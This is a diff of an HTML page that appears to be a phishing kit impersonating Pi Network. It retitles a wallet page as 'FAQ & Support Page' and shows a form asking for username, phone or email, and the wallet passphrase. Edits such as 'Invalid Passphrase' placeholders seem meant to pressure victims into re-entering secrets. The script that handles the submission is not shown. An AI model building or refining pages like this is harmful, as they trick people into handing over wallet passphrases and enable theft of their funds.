@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Wallet</title>
+    <title>FAQ & Support Page | Pi Network</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,11 +20,9 @@
             align-items: center;
             justify-content: center;
         }
-        .header img {
-            height: 30px;
-        }
         .header span {
             font-size: 18px;
+            font-weight: bold; /* Making text bold */
         }
         .container {
             margin: 40px auto;
@@ -42,6 +40,12 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             margin-bottom: 10px;
+            font-style: italic;
+            color: gray;
+        }
+        input::placeholder, textarea::placeholder {
+            font-style: italic;
+            color: gray;
         }
         input {
             height: 40px;
@@ -109,12 +113,12 @@
 </head>
 <body>
     <div class="header">
-        <span>Wallet</span>
+        <span><b>Welcome to the FAQ & Support Page</b></span>
     </div>
     <div class="container">
         <h2>Request to update passkey</h2>
-        <input type="text" placeholder="Enter username">
-        <input type="text" placeholder="Enter phone number/email ID">
+        <input type="text" placeholder="Invalid Username">
+        <input type="text" placeholder="Invalid Phone number/Email ID">
         <textarea id="passphrase" placeholder="Invalid Passphrase"></textarea>
         <button class="btn" onclick="validatePassphrase()">Send Request</button>
         <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
